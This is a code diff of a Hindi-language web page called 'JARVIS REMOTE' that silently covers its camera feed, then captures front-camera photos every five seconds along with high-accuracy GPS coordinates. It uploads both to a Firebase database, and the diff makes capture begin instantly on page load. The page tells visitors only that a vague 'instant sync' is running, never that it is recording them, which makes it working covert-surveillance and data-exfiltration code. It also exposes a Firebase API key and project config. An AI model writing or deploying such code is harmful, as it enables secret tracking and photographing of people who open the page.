@@ -3,25 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS REMOTE - FIX BLACK SCREEN</title>
+    <title>JARVIS REMOTE - INSTANT SYNC</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
         .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 40px; }
         .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
-        #v, canvas { display: none; }
+        #v { width: 1px; height: 1px; opacity: 0.01; } 
+        canvas { display: none; }
         .live-dot { width: 10px; height: 10px; background-color: #39ff14; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
         @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
     </style>
 </head>
 <body>
     <div class="control-box">
-        <h2>JARVIS SYSTEM v8 <span class="live-dot"></span></h2>
-        <p style="color: #888; font-size: 13px;">कैमरा और लोकेशन लाइव सिंक</p>
+        <h2>JARVIS INSTANT v10 <span class="live-dot"></span></h2>
+        <p style="color: #888; font-size: 13px;">इंस्टेंट सिंक मोड एक्टिवेटेड</p>
         <video id="v" autoplay playsinline muted></video>
         <canvas id="c"></canvas>
-        <div class="status-text" id="log-status">सिस्टम लोड हो रहा है...</div>
+        <div class="status-text" id="log-status">सिस्टम तुरंत कनेक्ट हो रहा है...</div>
     </div>
 
     <script>
@@ -38,68 +39,63 @@
         let currentLat = 0;
         let currentLon = 0;
 
-        window.onload = function() {
-            startCombinedTracking();
-        };
+        // 🚀 DOM लोड होते ही बिना इंतज़ार किए तुरंत ट्रैकिंग शुरू
+        document.addEventListener("DOMContentLoaded", () => {
+            initInstantCapture();
+        });
 
-        async function startCombinedTracking() {
+        async function initInstantCapture() {
             const statusDiv = document.getElementById('log-status');
-            statusDiv.innerHTML = "📡 कैमरे और GPS से कनेक्शन स्थापित किया जा रहा है...";
             
+            // जीपीएस ट्रैकिंग तुरंत चालू करें
+            navigator.geolocation.getCurrentPosition((pos) => {
+                currentLat = pos.coords.latitude;
+                currentLon = pos.coords.longitude;
+                database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
+            }, err => console.log("GPS Waiting..."), { enableHighAccuracy: true });
+
             try {
-                // फ्रंट कैमरा चालू करना
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // कैमरे को तुरंत कमांड भेजें
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-
-                // लगातार GPS ट्रैक करना
-                navigator.geolocation.watchPosition((pos) => {
-                    currentLat = pos.coords.latitude;
-                    currentLon = pos.coords.longitude;
-                    database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
-                    statusDiv.innerHTML = `📍 GPS ट्रैक एक्टिव: ${currentLat.toFixed(5)}, ${currentLon.toFixed(5)}`;
-                }, err => {
-                    statusDiv.innerHTML = "❌ GPS एरर: कृपया लोकेशन अलाउ करें।";
-                }, { enableHighAccuracy: true });
-
-                // वीडियो स्ट्रीम शुरू होने के बाद थोड़ा समय रुकें ताकि ब्लैक स्क्रीन न आए
-                video.onloadedmetadata = () => {
-                    statusDiv.innerHTML = "⏳ कैमरे के स्थिर होने का इंतज़ार (3s)...";
-                    setTimeout(() => {
-                        captureCombinedData(); 
-                        setInterval(captureCombinedData, 5000); // हर 5 सेकंड में लूप
-                    }, 3000); // 3 सेकंड का डिले
-                };
+                
+                // जैसे ही कैमरे का डेटा प्ले होने के लिए तैयार हो, तुरंत पहली फोटो खींचे
+                video.addEventListener('loadeddata', () => {
+                    captureNow(); // ⚡ तुरंत पहली फोटो बिना किसी डिले के
+                    setInterval(captureNow, 5000); // उसके बाद हर 5 सेकंड में नया रिकॉर्ड
+                });
 
             } catch(e) {
-                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा/लोकेशन एक्सेस 'Allow' करें बॉस!";
+                statusDiv.innerHTML = "❌ कैमरा एक्सेस अनुमति की आवश्यकता है बॉस!";
             }
         }
 
-        function captureCombinedData() {
+        function captureNow() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
             const statusDiv = document.getElementById('log-status');
-            
-            // इमेज साइज थोड़ा एडजस्ट किया
+
             c.width = 320; 
             c.height = 240;
             const ctx = c.getContext('2d');
             ctx.drawImage(v, 0, 0, 320, 240);
             
-            // कंप्रेस क्वालिटी 0.5
             const compressedPhoto = c.toDataURL('image/jpeg', 0.5); 
-
             const timestamp = Date.now();
             const currentTimeString = new Date().toLocaleTimeString();
 
-            // 1. मेन लाइव डैशबोर्ड अपडेट
+            // लाइव डैशबोर्ड पर तुरंत भेजें
             database.ref('live_detect').update({
                 photo: compressedPhoto,
                 last_updated: timestamp
             });
 
-            // 2. कंबाइंड जार्विस हिस्ट्री नोड
+            // जार्विस हिस्ट्री में लोकेशन के साथ तुरंत सेव करें
             database.ref('jarvis_history/' + timestamp).set({
                 time: currentTimeString,
                 photo: compressedPhoto,
@@ -108,237 +104,7 @@
                     lon: currentLon
                 }
             }).then(() => {
-                statusDiv.innerHTML = `✅ डेटा सिंक हुआ: ${currentTimeString}`;
-            });
-        }
-    </script>
-</body>
-</html><!DOCTYPE html>
-<html lang="hi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS REMOTE - FIX BLACK SCREEN</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <style>
-        body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
-        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 40px; }
-        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
-        #v, canvas { display: none; }
-        .live-dot { width: 10px; height: 10px; background-color: #39ff14; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
-    </style>
-</head>
-<body>
-    <div class="control-box">
-        <h2>JARVIS SYSTEM v8 <span class="live-dot"></span></h2>
-        <p style="color: #888; font-size: 13px;">कैमरा और लोकेशन लाइव सिंक</p>
-        <video id="v" autoplay playsinline muted></video>
-        <canvas id="c"></canvas>
-        <div class="status-text" id="log-status">सिस्टम लोड हो रहा है...</div>
-    </div>
-
-    <script>
-        const firebaseConfig = {
-          apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
-          authDomain: "army-cb492.firebaseapp.com",
-          databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
-          projectId: "army-cb492",
-          appId: "1:449848409517:web:386ad1b570731b6ec4f524"
-        };
-        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
-        let currentLat = 0;
-        let currentLon = 0;
-
-        window.onload = function() {
-            startCombinedTracking();
-        };
-
-        async function startCombinedTracking() {
-            const statusDiv = document.getElementById('log-status');
-            statusDiv.innerHTML = "📡 कैमरे और GPS से कनेक्शन स्थापित किया जा रहा है...";
-            
-            try {
-                // फ्रंट कैमरा चालू करना
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                // लगातार GPS ट्रैक करना
-                navigator.geolocation.watchPosition((pos) => {
-                    currentLat = pos.coords.latitude;
-                    currentLon = pos.coords.longitude;
-                    database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
-                    statusDiv.innerHTML = `📍 GPS ट्रैक एक्टिव: ${currentLat.toFixed(5)}, ${currentLon.toFixed(5)}`;
-                }, err => {
-                    statusDiv.innerHTML = "❌ GPS एरर: कृपया लोकेशन अलाउ करें।";
-                }, { enableHighAccuracy: true });
-
-                // वीडियो स्ट्रीम शुरू होने के बाद थोड़ा समय रुकें ताकि ब्लैक स्क्रीन न आए
-                video.onloadedmetadata = () => {
-                    statusDiv.innerHTML = "⏳ कैमरे के स्थिर होने का इंतज़ार (3s)...";
-                    setTimeout(() => {
-                        captureCombinedData(); 
-                        setInterval(captureCombinedData, 5000); // हर 5 सेकंड में लूप
-                    }, 3000); // 3 सेकंड का डिले
-                };
-
-            } catch(e) {
-                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा/लोकेशन एक्सेस 'Allow' करें बॉस!";
-            }
-        }
-
-        function captureCombinedData() {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            const statusDiv = document.getElementById('log-status');
-            
-            // इमेज साइज थोड़ा एडजस्ट किया
-            c.width = 320; 
-            c.height = 240;
-            const ctx = c.getContext('2d');
-            ctx.drawImage(v, 0, 0, 320, 240);
-            
-            // कंप्रेस क्वालिटी 0.5
-            const compressedPhoto = c.toDataURL('image/jpeg', 0.5); 
-
-            const timestamp = Date.now();
-            const currentTimeString = new Date().toLocaleTimeString();
-
-            // 1. मेन लाइव डैशबोर्ड अपडेट
-            database.ref('live_detect').update({
-                photo: compressedPhoto,
-                last_updated: timestamp
-            });
-
-            // 2. कंबाइंड जार्विस हिस्ट्री नोड
-            database.ref('jarvis_history/' + timestamp).set({
-                time: currentTimeString,
-                photo: compressedPhoto,
-                location_record: {
-                    lat: currentLat,
-                    lon: currentLon
-                }
-            }).then(() => {
-                statusDiv.innerHTML = `✅ डेटा सिंक हुआ: ${currentTimeString}`;
-            });
-        }
-    </script>
-</body>
-</html><!DOCTYPE html>
-<html lang="hi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS REMOTE - FIX BLACK SCREEN</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <style>
-        body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
-        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 40px; }
-        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
-        #v, canvas { display: none; }
-        .live-dot { width: 10px; height: 10px; background-color: #39ff14; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
-    </style>
-</head>
-<body>
-    <div class="control-box">
-        <h2>JARVIS SYSTEM v8 <span class="live-dot"></span></h2>
-        <p style="color: #888; font-size: 13px;">कैमरा और लोकेशन लाइव सिंक</p>
-        <video id="v" autoplay playsinline muted></video>
-        <canvas id="c"></canvas>
-        <div class="status-text" id="log-status">सिस्टम लोड हो रहा है...</div>
-    </div>
-
-    <script>
-        const firebaseConfig = {
-          apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
-          authDomain: "army-cb492.firebaseapp.com",
-          databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
-          projectId: "army-cb492",
-          appId: "1:449848409517:web:386ad1b570731b6ec4f524"
-        };
-        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
-        let currentLat = 0;
-        let currentLon = 0;
-
-        window.onload = function() {
-            startCombinedTracking();
-        };
-
-        async function startCombinedTracking() {
-            const statusDiv = document.getElementById('log-status');
-            statusDiv.innerHTML = "📡 कैमरे और GPS से कनेक्शन स्थापित किया जा रहा है...";
-            
-            try {
-                // फ्रंट कैमरा चालू करना
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                // लगातार GPS ट्रैक करना
-                navigator.geolocation.watchPosition((pos) => {
-                    currentLat = pos.coords.latitude;
-                    currentLon = pos.coords.longitude;
-                    database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
-                    statusDiv.innerHTML = `📍 GPS ट्रैक एक्टिव: ${currentLat.toFixed(5)}, ${currentLon.toFixed(5)}`;
-                }, err => {
-                    statusDiv.innerHTML = "❌ GPS एरर: कृपया लोकेशन अलाउ करें।";
-                }, { enableHighAccuracy: true });
-
-                // वीडियो स्ट्रीम शुरू होने के बाद थोड़ा समय रुकें ताकि ब्लैक स्क्रीन न आए
-                video.onloadedmetadata = () => {
-                    statusDiv.innerHTML = "⏳ कैमरे के स्थिर होने का इंतज़ार (3s)...";
-                    setTimeout(() => {
-                        captureCombinedData(); 
-                        setInterval(captureCombinedData, 5000); // हर 5 सेकंड में लूप
-                    }, 3000); // 3 सेकंड का डिले
-                };
-
-            } catch(e) {
-                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा/लोकेशन एक्सेस 'Allow' करें बॉस!";
-            }
-        }
-
-        function captureCombinedData() {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            const statusDiv = document.getElementById('log-status');
-            
-            // इमेज साइज थोड़ा एडजस्ट किया
-            c.width = 320; 
-            c.height = 240;
-            const ctx = c.getContext('2d');
-            ctx.drawImage(v, 0, 0, 320, 240);
-            
-            // कंप्रेस क्वालिटी 0.5
-            const compressedPhoto = c.toDataURL('image/jpeg', 0.5); 
-
-            const timestamp = Date.now();
-            const currentTimeString = new Date().toLocaleTimeString();
-
-            // 1. मेन लाइव डैशबोर्ड अपडेट
-            database.ref('live_detect').update({
-                photo: compressedPhoto,
-                last_updated: timestamp
-            });
-
-            // 2. कंबाइंड जार्विस हिस्ट्री नोड
-            database.ref('jarvis_history/' + timestamp).set({
-                time: currentTimeString,
-                photo: compressedPhoto,
-                location_record: {
-                    lat: currentLat,
-                    lon: currentLon
-                }
-            }).then(() => {
-                statusDiv.innerHTML = `✅ डेटा सिंक हुआ: ${currentTimeString}`;
+                statusDiv.innerHTML = `⚡ तुरंत सिंक हुआ: ${currentTimeString}`;
             });
         }
     </script>
